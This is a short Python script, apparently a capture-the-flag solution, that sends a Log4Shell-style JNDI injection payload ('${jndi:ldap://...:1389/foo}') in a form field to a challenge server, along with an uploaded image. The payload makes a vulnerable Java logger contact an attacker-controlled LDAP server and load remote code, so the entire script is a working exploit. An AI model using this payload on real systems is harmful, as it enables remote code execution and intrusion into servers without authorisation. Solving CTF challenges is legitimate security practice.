from pathlib import Path
from requests import post

with post(
    "https://text-polyfill-982935551e3a.1753ctf.com/process",
    data={
        "text": "${jndi:ldap://113.253.174.118:1389/foo}",
    },
    files={
        "image": Path("image.jpg").read_bytes(),
    },
) as res:
    print(res.status_code)
